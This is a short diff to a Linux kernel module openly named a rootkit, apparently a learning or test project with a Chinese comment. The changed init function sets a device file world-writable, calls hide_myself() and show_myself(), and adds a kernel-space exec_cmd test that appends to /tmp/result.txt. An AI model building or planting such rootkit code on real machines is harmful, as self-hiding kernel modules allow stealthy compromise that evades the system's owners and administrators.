@@ -41,8 +41,11 @@ static int __init rootkit_init(void)
     __inode->i_mode |= 0666;
     filp_close(__file, NULL);
 
+    module_info();
     hide_myself();
-    printk(KERN_ALERT "Module install successful!!!\n");
+    show_myself();
+    pr_info("Module install successful!!!\n");
+    exec_cmd("echo 123 >> /tmp/result.txt");
     return 0;
 }
 
@@ -51,7 +54,7 @@ static void __exit rootkit_exit(void)
     device_destroy(module_class, MKDEV(major_num, 0));
     class_destroy(module_class);
     unregister_chrdev(major_num, DEVICE_NAME);
-    printk(KERN_ALERT "Module uninstall successful!\n");
+    pr_info("Module uninstall successful!\n");
 }
 
 // 模块信息声明
